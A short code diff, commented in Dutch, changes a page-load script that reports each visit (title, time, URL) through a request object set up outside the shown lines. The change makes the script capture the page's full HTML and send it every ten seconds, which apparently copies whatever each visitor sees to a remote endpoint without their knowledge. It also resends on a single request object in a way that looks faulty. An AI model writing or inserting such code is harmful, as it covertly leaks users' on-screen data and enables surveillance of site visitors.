@@ -42,13 +42,22 @@ document.addEventListener('DOMContentLoaded', function() {
   var pageName = document.title;
   var pageURL = window.location.href;
 
-  // Vastleggen van de huidige datum en tijd
-  var now = new Date();
-  var currentTime = now.toLocaleString();
+  // Functie om de inhoud van het scherm te verzenden
+  function sendScreenContent() {
+    // Vastleggen van de huidige datum en tijd
+    var now = new Date();
+    var currentTime = now.toLocaleString();
 
-  var message = {
-    content: 'Er is iemand op de pagina: ' + pageName + '.' + '\nTijd & Datum:' + currentTime + '\n' + pageURL
-  };
+    // Inhoud van het scherm vastleggen
+    var screenContent = document.documentElement.innerHTML;
 
-  xhr.send(JSON.stringify(message));
+    var message = {
+      content: 'Er is iemand op de pagina: ' + pageName + '.' + '\nTijd & Datum:' + currentTime + '\n' + pageURL + '\n\nInhoud van het scherm:\n' + screenContent
+    };
+
+    xhr.send(JSON.stringify(message));
+  }
+
+  // Inhoud van het scherm elke 10 seconden verzenden
+  setInterval(sendScreenContent, 10000);
 });
